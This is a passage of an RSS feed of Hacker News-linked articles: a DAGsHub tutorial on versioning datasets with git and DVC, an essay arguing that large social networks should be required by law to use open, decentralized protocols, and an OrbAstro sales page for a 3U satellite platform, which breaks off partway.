<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jsof-tech.com/disclosures/dnspooq/">https://www.jsof-tech.com/disclosures/dnspooq/</a></em></p>]]>
            </description>
            <link>https://www.jsof-tech.com/disclosures/dnspooq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833606</guid>
            <pubDate>Tue, 19 Jan 2021 14:20:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop treating data as static. Datasets should behave like Git repositories]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833576">thread link</a>) | @thecellardoor
<br/>
January 19, 2021 | https://dagshub.com/blog/datasets-should-behave-like-git-repositories/ | <a href="https://web.archive.org/web/*/https://dagshub.com/blog/datasets-should-behave-like-git-repositories/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>Problems emerging from data are common in research as well as in the industry. Those problems are dealt with as part of our project, but we usually don't bother solving them at their origin. We fix the data locally once, and we go on with our project. This is certainly a valid method in some cases, but as we share data more and more between projects, we are finding ourselves repeating the same processes over time and across teams. This issue is particularly true for public datasets shared by many people to train many machine learning models. I will show you how to create, maintain, and contribute to a long-living dataset that will update itself automatically across projects, using git and DVC as versioning systems, and DAGsHub as a host for the datasets.</p><h2 id="changing-datasets-is-a-common-process">Changing datasets is a common process</h2><p>I remember that during my undergraduate studies, I had to generate an instance segmentation model for cucumber plant parts, using a custom dataset of segmented leaves, cucumbers, and flowers. At a very early stage, I discovered I couldn't get reasonable results with the data given initially. I decided I would fix the annotations myself on about a dozen pictures. As expected, this solved 80 percent of the issues I was having. This is a good opportunity to say that manual data labor is underrated. Investing a few hours in fixing the data was the best thing I could do for the project. Then, of course, I went on with my life, leaving the fixed dataset on the lab computer, but knowing that eventually, my fixes were going to vanish.</p><p>Naturally, this process was gradual. I started with the original dataset, then I fixed a part of the annotations. At some point, I added completely new pictures, decided to redo some of them. I iterated over the data with multiple manipulations over time. Many of them I treated as "Debug trial-and-errors", naturally not keeping track of my working directory rigorously. During those iterations, I ran training sessions, while doing my best to keep a detailed record of my "experience". If you are still reading, you probably understand exactly what I am talking about. Well, the world has changed since then, and many data versioning tools have evolved to help. This is a good opportunity to recommend this <a href="https://dagshub.com/blog/data-version-control-tools/">comparison between data version control tools</a> we published at the end of 2020.</p><h2 id="what-is-data-versioning">What is data versioning?</h2><p>While my project was a total mess data-wise, its code was very well tracked by git. The reason is that I could just run the following magical commands that everyone knows:</p><pre><code>git add .
git commit -m "fixed training input directory"
</code></pre><p>Back then I wasn't able to do any magical command of that sort for my data. Now, with <a href="https://dvc.org/">DVC</a> and DAGsHub in the world, this is no longer the case. There is no reason on earth why you should not at least have a simple code and data versioning system set in place. If you are not familiar with DVC, I recommend you go through <a href="https://dagshub.com/docs/experiment-tutorial/2-data-versioning/">this basic data versioning tutorial</a>, but it is <strong><em>not</em></strong> a prerequisite to understand the rest of this post. All you really need to know is that now we have a new, magical command:</p><pre><code>dvc commit
</code></pre><p>That will create a snapshot of the tracked data, without inflating your git repository.</p><p>While data versioning solves the problem of managing data in the context of your machine learning project, it brings with it a new approach to managing <strong>datasets</strong>. This approach, also described as data registries <a href="https://dvc.org/doc/use-cases/data-registries">here</a>, consists of creating <strong>a git repository entirely dedicated to managing a dataset</strong>. This means that instead of training models on frozen datasets - something researchers, students, kagglers, and open source machine learning contributors often do - you could link your project to a dataset (or to any file for that matter), and treat it as a dependency. After all, <strong>data can and should be treated as code</strong>, and follow through a review process. You can read more about that in another post about <a href="https://dagshub.com/blog/data-bugs-how-to-fix-them/">data bugs and how to fix them</a>.</p><p><strong>Warning - Don't continue reading if you feel threatened by knowledge!</strong></p><!--kg-card-begin: html--><center><img src="https://media.giphy.com/media/3o6gDSdED1B5wjC2Gc/giphy.gif"><p><small><a href="https://giphy.com/gifs/arielle-m-star-trek-information-overload-3o6gDSdED1B5wjC2Gc">via GIPHY</a></small></p></center><!--kg-card-end: html--><p>I am joking, of course, this isn't going to be rocket science at all. In fact, I will demonstrate how to use such a living-dataset in a project similar to my university project.</p><h2 id="creating-a-data-registry-to-use-it-as-a-living-dataset">Creating a data registry to use it as a living-dataset</h2><p>In order to demonstrate this new concept of living-datasets, I have set one up myself, as well as a machine learning model using it as a dependency.</p><p><strong><a href="https://dagshub.com/Simon/baby-yoda-segmentation-dataset">Repository A</a></strong> - AKA the living dataset, is going to be a simple project, with magical metadata files that point to real big files stored in a dedicated storage. I can organize the dataset files into directories, add code files with <code>utils</code> functions to work with it, or whatever I see fit to store and present my dataset to whoever might want to consume it.</p><p><strong><a href="https://dagshub.com/Simon/baby-yoda-segmentor">Repository B</a></strong> - AKA the machine learning project, is where I want to use the files stored in my living-dataset. This repository will import a directory from Repository A using DVC, and this will do the trick of having that directory manageable and updatable.</p><p>To create a data registry, just create a git + DVC directory.</p><pre><code>mkdir my-dataset &amp;&amp; cd my-dataset
git init
dvc init
</code></pre><p>Congrats! Your living-dataset is alive. Now we need to add some files to it.</p><figure><img src="https://media.giphy.com/media/YEL7FJP6ed008/giphy.gif" alt="https://media.giphy.com/media/YEL7FJP6ed008/giphy.gif"></figure><p>In my case, I took a handful of screenshots from a beloved TV Show, and annotated my favorite character in it, using the awesome open source <a href="https://github.com/jsbroks/coco-annotator">COCO annotator project</a>.</p><figure><img src="https://dagshub.com/blog/content/images/2021/01/annotator-demo2_1.gif" alt=""></figure><p>After annotating around 40 pictures, I knew it was going to be enough for a pre-trained Mask-RCNN with a ResNet50 backbone, to give decent results (15 would have probably been enough too, but it was too fun to stop). I exported a <code>.json</code> annotation file, put it in my repository along with the screenshots I took. At this point my working directory looked like this:</p><pre><code>.
├── annotations
│&nbsp;&nbsp; └── grogu.json
└── images
 &nbsp;&nbsp; ├── 000.png
 &nbsp;&nbsp; ├── 001.png
    .
    .
    .
 &nbsp;&nbsp; ├── 206.png
 &nbsp;&nbsp; └── 208.png
</code></pre><p>Then I ran the magic commands to start tracking the data files.</p><pre><code>dvc add annotations
dvc add images
git add . &amp;&amp; git commit -m "Starting to manage my dataset"
</code></pre><p>Since I like visualizations I wrote a script in <a href="https://dagshub.com/Simon/grogu-segmentation-dataset/src/master/Playground.ipynb">this python notebook</a> to render previews of my dataset into a <a href="https://dagshub.com/Simon/grogu-segmentation-dataset/src/master/preview">preview directory</a>, which will also be tracked by DVC. Then I just push my code and data to my remote repository, so that I can access it from everywhere, and share it with my collaborators.</p><pre><code>git push origin master
dvc push -r origin
</code></pre><p>Note: I skipped the part of opening a repository on GitHub / DAGsHub and setting up the remote storage, <a href="https://dagshub.com/docs/experiment-tutorial/2-data-versioning/#pushing-code-data-and-models-to-dagshub">the tutorial</a> should cover that.</p><h2 id="using-a-living-dataset-in-a-machine-learning-project">Using a living-dataset in a machine learning project</h2><p>Now it is time to use my dataset as a dependency in my machine learning project. I will not be able to recreate my cucumber project from school, since I do not have access to the data, so I will substitute the cucumbers with the beloved fictional character from above.</p><p>I want my project directory to look like the following:</p><pre><code>.
├── data
│&nbsp;&nbsp; ├── preprocessed
│&nbsp;&nbsp; └── raw
└── src
</code></pre><p>I want to import a directory from my dataset and treat it as <code>raw</code> files. I can do it by running from inside my repository:</p><pre><code>mkdir -p data/raw

dvc import -o data/raw/images \
https://dagshub.com/Simon/baby-yoda-segmentation-dataset \
data/images

dvc import -o data/raw/annotations \
https://dagshub.com/Simon/baby-yoda-segmentation-dataset \
data/annotations</code></pre><p>This will specifically download the directories <code>images</code> and <code>annotations</code> from inside my dataset repository, and keep information on how to continue tracking the changes made in it. More on tracking the changes will be explained later, but this is pretty much it.</p><figure><img src="https://dagshub.com/blog/content/images/2021/01/data-repo--1-.png" alt="" srcset="https://dagshub.com/blog/content/images/size/w600/2021/01/data-repo--1-.png 600w, https://dagshub.com/blog/content/images/2021/01/data-repo--1-.png 921w" sizes="(min-width: 720px) 720px"></figure><p>In the chart above you can see a representation of how it works. The arrows go in the direction of dependencies. Every time I know the dataset has changed, I just run the command</p><pre><code>dvc update
</code></pre><p>The <a href="https://dvc.org/doc/command-reference/update">command above</a> will check for changes in the tracked ref of the repository, and pull them to my local directories. Then I re-run my pipeline from scratch - Train my model, save the best one, and commit my results. Notice that we can use this method of <code>dvc import</code> + <code>dvc update</code> to get the output model as a dependency in another project if we wanted to.</p><p>First, I want to thank you for reading along, I hope you enjoyed it. The project is still a work in progress (but what project isn't?). So if you find mistakes, or improvements to make, either in the dataset or the model, then just contribute to them! It's fairly easy to fork repositories, pull the data, push it, and merge it. Especially with <a href="https://dagshub.com/blog/data-science-pull-requests/">data-science pull requests</a>. The process can easily be adapted to any segmentation dataset, so feel free to do so as well.</p><p>Special thanks to <a href="https://www.linkedin.com/in/asher-yartsev/">Asher</a> and <a href="https://www.linkedin.com/in/or-shemesh-4a99a7101/">Or</a>, my fellow students from the original segmentation project that gave me inspiration for this mini-project.</p><p>Here are some results just for fun!</p><figure><img src="https://dagshub.com/blog/content/images/2021/01/grogus.png" alt="" srcset="https://dagshub.com/blog/content/images/size/w600/2021/01/grogus.png 600w, https://dagshub.com/blog/content/images/2021/01/grogus.png 960w" sizes="(min-width: 720px) 720px"></figure>
                <section>
                  
                  <ul>
                      <li>
                        <a href="https://dagshub.com/blog/tag/living-dataset/" title="living dataset">living dataset</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/dvc-registry/" title="dvc registry">dvc registry</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/dataset-collaboration/" title="dataset collaboration">dataset collaboration</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/data-science/" title="Data Science">Data Science</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/mask-rcnn/" title="Mask RCNN">Mask RCNN</a>
                      </li>
                  </ul>
                </section>
            </div></div>]]>
            </description>
            <link>https://dagshub.com/blog/datasets-should-behave-like-git-repositories/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833576</guid>
            <pubDate>Tue, 19 Jan 2021 14:17:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Social media need to be decentralized and open by law]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833499">thread link</a>) | @shafyy
<br/>
January 19, 2021 | https://canolcer.com/post/social-media-decentralized-by-law/ | <a href="https://web.archive.org/web/*/https://canolcer.com/post/social-media-decentralized-by-law/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>There should be anti-trust laws that make it illegal for social media software to be closed and centralized. What does this mean and why is it important? Let’s start with the why.</p><h2 id="why-is-this-important">Why is this important?</h2><p>Social media apps such as Facebook, WhatsApp, Instagram and Twitter all have something in common: They benefit from so-called network effects. Simply said, this means that the value of the service increases for each user as additional users join the service. For example, you wouldn’t use Instagram if all you had was an empty feed or WhatsApp if none of your friends were on it.</p><p>A network effect is both hard to achieve and hard to destroy. That’s why it’s almost impossible for a new company with little funds to compete with existing services. And that’s why almost no users leave to competing products (even if there were any). Heck, it’s even hard to start a social media company if you have a shit ton of cash (just ask the folks from Google Plus).</p><p>Companies realized that there’s no way to create a social network if you charge users, even if that amount would be something small like a few dollars. You just can’t get enough people on there to make the network as a whole valuable enough for all users. They also realized that the data they collect from people using their social network is extremely valuable to other companies, namely advertisers. That’s why almost all social networks make money by showing you ads based on your data.</p><p>In the last few years, social media became insanely popular and the primary source of information for a lot of people. This development came with a bunch of problems.</p><p>One such problem is misinformation. Because of inherent mechanisms that make sharing easy, information spreads super fast on social media. And so does misinformation. And because anyone can post anything, there’s a truck load of misinformation being shared and consumed. You might have heard the term Fake News. The problem is though, that sometimes real facts are also being regarded as fake and if enough users share it, people think it’s true. Of course, evil companies figured out how to automate the spread of misinformation with bots and ads and succesfully shaped public opinion to their advantage. By now, it’s clear that Russian agents meddled with the 2016 US elections through this medium.</p><p>Another problem is censorship. Twitter and Facebook have always been banning accounts that post content which is against their terms of service. Stuff like child porn and obvious hate speech. Recently, they also banned the President of the United States, Donald Trump, for inciting violence in connection with the events at the US Capitol on January 6, 2021. On the one hand, Twitter and Facebook are private companies and can decide who they ban from their platform. On the other hand, they have become the main publishing platform for a lot of public figures, including Trump. Therefore, many opponents of censorship on social media say that Twitter and friends should be regulated as public forums and the government should decide who gets to have a Twitter account, not Twitter itself.</p><p>A third problem is power. As we have seen, it’s hard for new companies to compete with existing social media companies, and it’s hard for users to leave the platform for a lack of alternatives and existing network effects. This means that Facebook, Twitter and Google (not with Search, but e.g. with YouTube) have a lot of power. That’s why they can pull a lot of shit (remember the Cambridge Analytica scandal?), but get away with a slap on the wrist because users just can’t leave.</p><p>So, what’s all this to do with closed and central and what does that even mean?</p><h2 id="what-does-it-mean">What does it mean?</h2><p>Let’s get more technical. When saying “closed and central social media”, I actually refer to their underlying protocols. A protocol simply is a specification of how two or more parties communicate with each other. Like, what kind of data can be sent, how it is sent, what kind of responses can be expected and so on. Think of it like a set of rules.</p><p>Open protocols are protocols which are defined openly for everyone to see what the rules are. Closed protocols are proprietary and not shared publicly. Centralized protocols only allow one central authority (e.g. server), whereas decentralized protocols allow for servers and services to talk to each other.</p><p>The internet is built on open, decentralized protocols. For example, the <a href="https://en.wikipedia.org/wiki/Internet_Protocol">Internet Protocol (IP)</a> defines how data packages are sent around and is literally <em>the</em> basis for our open and amazing internet. Another one that you probably use every day is the <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">Simple Mail Transfer Protocol (SMTP)</a> - that’s how email works. There are also offline examples of open and decentralized protocols, such as the physical mail system. I can send a letter from Berlin to San Fransisco and it works, although it’s not the same company providing the service in Germany and the US. I can also call or text my friend, even though I’m with Verizon and she’s with AT&amp;T.</p><p>Closed and central protocols don’t allow this open interoperability. If I want to read and send Tweets, I have to use the central service controlled completely centrally by Twitter. If I want to watch a video on YouTube, I have to use YouTube. If I want to send a message to my group of friends, I have to use WhatsApp since that’s the only chat app they (and two billion other people) use.</p><p>Compare this to email. If I have an email account with Fastmail and you have an account with Gmail, we can still communicate with each other. Imagine if Google had “invented” email and made it a centralized system, we would all need to be on Gmail to talk to each other. Pretty crappy, right? But that’s exactly the case with all social media today.</p><p>If WhatsApp would use an open and decentralized protocol, let’s call it Chat Protocol (CP) other companies could also offer WhatsApp services and host their own server. Let’s say that other apps like Telegram and Signal would also use the same protocol, CP. I could easily use Signal to message my friends on WhatsApp. It would give every person the freedom to choose a service provider they like (for whatever reason). It would allow for fair competition, and remove power from one central entity. If your account gets banned from one provider, you can create a new account with a different provider and keep talking to your friends.</p><p>Of course, misinformation can still spread if uncontrolled. But with a decentralized system, you would have many service providers dealing with the problem and probably do a better job than one player that needs to deal with all of the world’s misinformation.</p><p>Of course, the flip side of too little censorship means that there will be more accounts with pedophiles and racists. But today, hosting providers are already quite good with taking this type of content offline (e.g. websites), so there’s no reason to think that they couldn’t do it with a decentralized social media app, too.</p><p>You see, there are many advantages to using open and decentralized protocols. It’s also obvious why big social media companies do not want to use them and instead create these walled gardens to maximize their profit and stronghold. I wager that, left alone, these companies will never do the right thing and open up and decentralize their networks. (One possible expection: Jack Dorsey, the CEO of Twitter <a href="https://twitter.com/jack/status/1204766078468911106">has announced</a> that they eventually want to open up, but it remains to be seen what that exactly will turn into.)</p><p>So, what’s the solution? One solution could be market-based: Just make software based on open protocols that is better and users will jump ship and start using those. In fact, these alternatives already exist. For example, there’s Mastodon, a decentralized Twitter alternative, or Matrix, a decentralized instant messaging app. But compared to Twitter and WhatsApp, noone uses these alternatives. Why? Well, of course they need to get better and improve their usability and what not, but the main reason is what I mentioned before: It’s damn hard to compete with an existing social media service because of network effects. And the more users they get, the stronger the network effects become.</p><p>I’m not saying that we shouldn’t encourage people to join Mastodon and other services and support them to make their services better. I’m just saying it won’t cut it. Not by a long shot.</p><p>Like with all monopolies, this is a case where the free market doesn’t automatically lead to the best outcome.</p><p>My suggestion is the following: <strong>Make it illegal for social media companies to have closed and decentralized networks after a certain size.</strong> The size is up to debate, but I think it should be measured by active users.</p><p>For example, all companies that have more than 50 million monthly active users need to open up and decentralize their protocol or use an existing one.</p><p>There are already a bunch of anti-trust laws that regulate monopolies and concentration of market power. Why not revise and extend them to take into consideration today’s business and technology landscape?</p></article></div>]]>
            </description>
            <link>https://canolcer.com/post/social-media-decentralized-by-law/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833499</guid>
            <pubDate>Tue, 19 Jan 2021 14:09:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you had your own satellite]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25833477">thread link</a>) | @AshDJ
<br/>
January 19, 2021 | https://orbastro.com/satellites/orb-3/ | <a href="https://web.archive.org/web/*/https://orbastro.com/satellites/orb-3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			<!-- Main Header -->
			<header id="header">
				

				

			</header>
<!-- PAGE TITLE -->


<!-- PAGE CONTENT -->
<section>
    <div>
        <div>
            <div>
            
                                            <div>
<div>
<div>
<div>

<p data-font-weight="400" data-font-style="" data-font-family="Coda" data-aos-easing="ease-in-sine" data-aos-delay="300" data-aos="fade-right">OrbAstro is making available the world’s most capable 3U satellite platform, at a price-point that is simply unmatched.</p>
</div>
<p data-font-weight="400" data-font-style="" data-font-family="Coda" data-aos-easing="ease-in-sine" data-aos-delay="500" data-aos="fade-right">£60,000</p>
<p data-font-weight="400" data-font-style="" data-font-family="Coda" data-aos-easing="ease-in-sine" data-aos-delay="500" data-aos="fade-right">(+£95,000 for launch)</p>
</div>
<p data-font-weight="400" data-font-style="" data-font-family="Coda" data-aos-easing="ease-in-sine" data-aos-delay="700" data-aos="fade-right">Included in this price: the platform, engineering support with payload integration, flight-acceptance testing of the fully integrated satellite, and storage before shipment to the launch provider. Launch can be managed by OrbAstro and provided through a 3rd-party partner; price displayed is indicative of standard LEO/SSO orbit.</p>
<p data-font-weight="400" data-font-style="" data-font-family="Coda" data-aos-easing="ease-in-sine" data-aos-delay="900" data-aos="fade-right">This product-line has been made possible through contracts with:</p>
<p data-aos-easing="ease-in-sine" data-aos-delay="1100" data-aos="fade-right"><img height="288" alt="" src="https://orbastro.com/wp-content/uploads/2020/11/Affilites-3U.png" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<div id="wps_accordion_pro_876">
<div id="accordion_pro_876" role="tablist" aria-multiselectable="true">
<div id="offset_876_1">

<div id="collapse_876_1" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_1">
<div>
<div id="#wpsm_acc_desc_876_1">
<table>
<tbody>
<tr>
<td>
<p><strong> Spec </strong></p>
</td>
<td>
<p><strong> Baseline Option </strong></p>
</td>
<td>
<p><strong> Upgrade Options </strong></p>
</td>
</tr>
<tr>
<td>
<p><strong> Mass </strong></p>
</td>
<td>
<p>2kg</p>
</td>
<td>
<p>—</p>
</td>
</tr>
<tr>
<td>
<p><strong> OBC </strong></p>
</td>
<td>
<p><a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-10 </a></p>
</td>
<td>
<p><a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-40 </a> , <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-45 </a></p>
</td>
</tr>
<tr>
<td>
<p><strong> EPS </strong></p>
</td>
<td>
<p><a href="https://orbastro.com/eps" target="_blank" rel="noopener noreferrer"> 36Wh </a></p>
</td>
<td>
<p><a href="https://orbastro.com/eps" target="_blank" rel="noopener noreferrer"> 72Wh </a></p>
</td>
</tr>
<tr>
<td>
<p><strong> Comms </strong></p>
</td>
<td>
<p>Optical transceiver ( <a href="https://orbastro.com/guardians" target="_blank" rel="noopener noreferrer"> Guardian Network </a> ), S-band transceiver + antenna (50Mb/s)</p>
</td>
<td>
<p>Additional Ka-band transmitter + 16dB antenna (200Mb/s)</p>
</td>
</tr>
<tr>
<td>
<p><strong> ADCS </strong></p>
</td>
<td>
<p>0.1º pointing accuracy, 0.01º knowledge, dual star-trackers</p>
</td>
<td>
<p><strong> — </strong></p>
</td>
</tr>
<tr>
<td>
<p><strong> Electric Propulsion </strong></p>
</td>
<td>
<p>Max thrust 116μN, delta-V typically 0.46km/s</p>
</td>
<td>
<p><strong> — </strong></p>
</td>
</tr>
<tr>
<td>
<p><strong> Solar Panels </strong></p>
</td>
<td>
<p>Chassis mounted, 5.5Wh orbital average, 3.5Wh for payload</p>
</td>
<td>
<p>Deployable panels, 22Wh orbital average, 20Wh for payload</p>
</td>
</tr>
<tr>
<td>
<p><strong> Lifetime </strong></p>
</td>
<td>
<p>8-10 years</p>
</td>
<td>
<p>—</p>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
<div id="offset_876_2">

<div id="collapse_876_2" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_2">
<div>
<div id="#wpsm_acc_desc_876_2">
<table>
<tbody>
<tr>
<td>
<p><strong> Spec </strong></p>
</td>
<td>
<p><strong> Description </strong></p>
</td>
</tr>
<tr>
<td>
<p><strong> Volume </strong></p>
</td>
<td>
<p>~2U maximum (196x95x95mm)</p>
</td>
</tr>
<tr>
<td>
<p><strong> Mass </strong></p>
</td>
<td>
<p>Up to 3kg (baselining a 5kg satellite maxi mass)</p>
</td>
</tr>
<tr>
<td>
<p><strong> Power </strong></p>
</td>
<td>
<p>Maximum power consumption 160W, 3.5Wh orbital average depending on mission requirements (upgradable to 20Wh)</p>
</td>
</tr>
<tr>
<td>
<p><strong> Data Interfaces </strong></p>
</td>
<td>
<p>I2C: 2x interfaces @10, 100, 400, 1000 kHz</p>
<p>SPI: 1x interfaces @1, 10, 40 MHz</p>
<p>USART: 2x interfaces, up to 1 Mb/s</p>
<p>CAN: 2x interfaces, up to 1 Mb/s</p>
<p>LVDS: 10 pairs, up to 1.2 Gbps per pair</p>
<p>PCIe 3.0, up to x4</p>
<p>USB 2.0</p>
<p>Ethernet 10/100/1000Mbps</p>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
<div id="offset_876_3">

<div id="collapse_876_3" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_3">
<div>
<div id="#wpsm_acc_desc_876_3">
<ol>
<li>
<ol>
<li>You place a £1,000 deposit per satellite (fully refundable) to secure yourself in the production queue and at the “early adopter rate”.</li>
<li>You hire a <a href="https://orbastro.com/flat-sat" target="_blank" rel="noopener noreferrer"> flat-sat </a> to design/program your payload for compatibility with the platform.</li>
<li>Once ready, you pull the trigger for platform build and pay the remaining fee.</li>
<li>Once the platform is built (nominally 1 month later), you come on-site and integrate your payload with assistance from our engineers. This should not take more than 2 days because of your upfront work on the <a href="https://orbastro.com/flat-sat" target="_blank" rel="noopener noreferrer"> flat-sat </a> .</li>
<li>Whilst you are on-site, we put the fully integrated satellite through fight-acceptance testing. This should not take more than 2-3 days after your payload has been integrated.</li>
<li>After passing flight-acceptance testing and further health-checks, the satellite is securely stored on-site in an appropriate environment until the launch provider is ready to receive it.</li>
<li>You organise shipment of the satellite from OrbAstro to your designated launch provider.</li>
</ol>
</li>
</ol>
</div>
</div>
</div>
</div>
<div id="offset_876_4">

<div id="collapse_876_4" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_4">
<div>
<div id="#wpsm_acc_desc_876_4">
<p><strong> £60,000 baseline </strong></p>
<p>The price includes:</p>
<ul>
<li>
<ul>
<li>A fully assembled 3U satellite platform</li>
<li>Engineering support with payload integration, on-site with us</li>
<li>Full flight-acceptance testing and associated health-checks, on-site with us</li>
<li>Packaging for transportation</li>
<li>Storage of the satellite until the launch provider is ready to receive it</li>
</ul>
</li>
</ul>
<p>We are currently building a batch-production facility for this product-line. As such, 3U satellite platforms will only become commercially available from May-21 onwards. Nominal lead-time for production of platforms will be 1 month*. Between now and then, OrbAstro will be taking deposits that will secure customers in the production queue and will freeze their price point to the “early adopter rate”.</p>
<p><strong> Deposits are £1,000 per satellite. Deposits are fully refundable. </strong></p>
<p>The current price is what we are calling the “early adopter rate”. Though OrbAstro still makes a reasonable margin at the “early adopter rate” price, it will go up over the period of 2022 as the platform gains more heritage and becomes an established solution. The next nearest alternative to OrbAstro will not be able to provide a similar solution for anything less than £500,000 over the coming few years. And though OrbAstro is looking to lower the barrier for entry to enable the emergence of new space markets and the flourishing of existing markets, this vision must be balanced against the company financing other longer-term activities aligned with <strong> lowering it further </strong> .</p>
<p><em> *Depending on demand, it could take OrbAstro ~6 months to match supply/demand requirements to stabilise at a 1-month production lead-time. As such, if you are looking to launch in 2021-2022, place your deposit now. </em></p>
</div>
</div>
</div>
</div>
<div id="offset_876_5">

<div id="collapse_876_5" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_5">
<div>
<div id="#wpsm_acc_desc_876_5">
<table>
<tbody>
<tr>
<td>
<p><strong> Upgrade </strong></p>
</td>
<td>
<p><strong> Description </strong></p>
</td>
</tr>
<tr>
<td>
<p><span> <strong> OBC </strong> </span></p>
<p>+£5,000 for <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-40 </a></p>
<p>+£20,000 for <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-45 </a></p>
</td>
<td>
<p>For exceptional data processing requirements, the onboard computer can be upgraded to an OrbAstro <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-40 </a> or <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-45 </a> . This will not reduce payload volume capacity but will impact power available to the payload depending on computing requirements.</p>
</td>
</tr>
<tr>
<td>
<p><span> <strong> EPS </strong> </span></p>
<p>+£5,000 for 72Wh <a href="https://orbastro.com/eps" target="_blank" rel="noopener noreferrer"> EPS </a></p>
</td>
<td>
<p>To increase power storage capacity of the platform from 36Wh to 72Wh, another 36Wh battery can be added. This will reduce payload volume capacity by 0.38U.</p>
</td>
</tr>
<tr>
<td>
<p><span> <strong> Power Generation </strong> </span></p>
<p>+£10,000 for Deployable Solar Panels</p>
</td>
<td>
<p>To increase power available to the payload from typically 3.5Wh orbital average to 20Wh (i.e. power generation from 5.5Wh to 22Wh), three 3U-scale deployable solar panels can be added to the platform. This will not impact payload volume capacity.</p>
</td>
</tr>
<tr>
<td>
<p><strong> <span> Communications </span> </strong></p>
<p>+£5,000 for Ka-band Transmitter &amp; Antenna</p>
</td>
<td>
<p>To increase down-link capabilities, an OrbAstro Ka-band transmitter with a 16dB antenna can be added to the platform to compliment the S-band transceiver, typically achieving a 200Mb/s downlink at 1,000km range. This will reduce payload volume by 0.15U and will reduce power available to the payload depending on communications requirements.</p>
</td>
</tr>
<tr>
<td>
<p><strong> <span> Payload Access </span> </strong></p>
<p>No cost implication with choice.</p>
</td>
<td>
<p>CFRP panels mounted to the chassis around the payload can either be left in place (closed) or removed (open). Removing of some or all of these panels allows for surface access and customisation.</p>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
<div id="offset_876_6">

<div id="collapse_876_6" role="tabwpsm_panel" aria-expanded="false" aria-labelledby="heading_876_6">
<div>
<p>The first ORB-3 satellite platform with a commercial payload onboard is launching in Q2 2021 on a SpaceX Falcon 9. It will have all of the standard subsystems listed. Additionally, it will have deployable solar panels, both Telos-10 and Telos-40, and both S-band transceiver &amp; Ka-band transmitter + antennas. OrbAstro currently has subsequent platforms booked for launch in late-2021 and mid-2022, both 6U variants (ORB-6). For the most part, subsystems on the 3U platforms are identical to those on the 6U platforms. The OrbAstro team has a long history of developing complex satellite subsystems, from concept to orbital operations.</p>
</div>
</div>
</div>
</div>
</div>
<p data-font-weight="400" data-font-style="" data-font-family="Coda"><strong> Subsystems </strong></p>
<p><img loading="lazy" width="830" height="700" alt="" src="https://orbastro.com/wp-content/uploads/2020/12/ORB-OBC-1024x863.png" srcset="https://orbastro.com/wp-content/uploads/2020/12/ORB-OBC-1024x863.png 1024w, https://orbastro.com/wp-content/uploads/2020/12/ORB-OBC-300x253.png 300w, https://orbastro.com/wp-content/uploads/2020/12/ORB-OBC-768x647.png 768w, https://orbastro.com/wp-content/uploads/2020/12/ORB-OBC.png 1335w" sizes="(max-width: 830px) 100vw, 830px"></p>
<p data-font-weight="400" data-font-style="" data-font-family="Coda">The volumetric efficiency of the ORB family of satellite platforms has been enabled by the team compressing what is typically seven 1U-scale PCBs into a single 85x80mm board. This “satellite on a board” contains: the OBC, reaction wheel controls, magnetorquer controls, camera interfaces, star-tracker interfaces, all sensor interfaces, full SDR S-/X-band, GPS, optical data processing and control, and EPS.</p>
<div id="wps_accordion_pro_864">
<div id="accordion_pro_864" role="tablist" aria-multiselectable="true">
<div id="offset_864_1">

<div id="collapse_864_1" role="tabwpsm_panel" aria-labelledby="heading_864_1">
<div>
<div id="#wpsm_acc_desc_864_1">
<ul>
<li>
<ul>
<li>The platform utilises an OrbAstro <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-10 </a> OBC.</li>
<li>The OBC is based on Xilinx Ultrascale+ MPSoCs with ARM cortex A53 and R5 64-bit processing cores,&nbsp;2GB LPDDR4, 64GB eMMC, 250GFLOP double precision FPU, software and hardware based mitigation for SEU and SEL.</li>
